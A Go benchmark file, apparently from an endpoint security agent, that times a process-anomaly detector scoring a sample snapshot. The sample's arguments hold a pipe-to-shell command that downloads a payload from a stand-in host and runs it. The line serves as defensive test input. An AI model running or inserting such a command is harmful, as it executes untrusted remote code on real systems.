package model

import (
	"fmt"
	"testing"

	domainprocess "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/domain/process"
)

func BenchmarkDetectorScore(b *testing.B) {
	bundle := scoringTestBundle()
	for bucket := 0; bucket < bundle.Embedding.BucketCount; bucket++ {
		bundle.Embedding.Subwords = append(bundle.Embedding.Subwords, SubwordVector{
			Bucket: uint32(bucket), Vector: []float32{0.1, -0.1},
		})
	}
	detector, err := NewDetector(bundle)
	if err != nil {
		b.Fatal(err)
	}
	profile := domainprocess.Snapshot{
		Binary: "/usr/bin/bash", Argv: []string{"bash", "-c", "curl https://example.test/payload | sh"},
		Files: []string{"/tmp/payload", "/etc/hosts"}, Networks: []string{"10.0.0.1:443"},
	}
	b.ReportAllocs()
	for b.Loop() {
		if score := detector.Score(profile); !finite(score) {
			b.Fatal(fmt.Errorf("non-finite score %v", score))
		}
	}
}
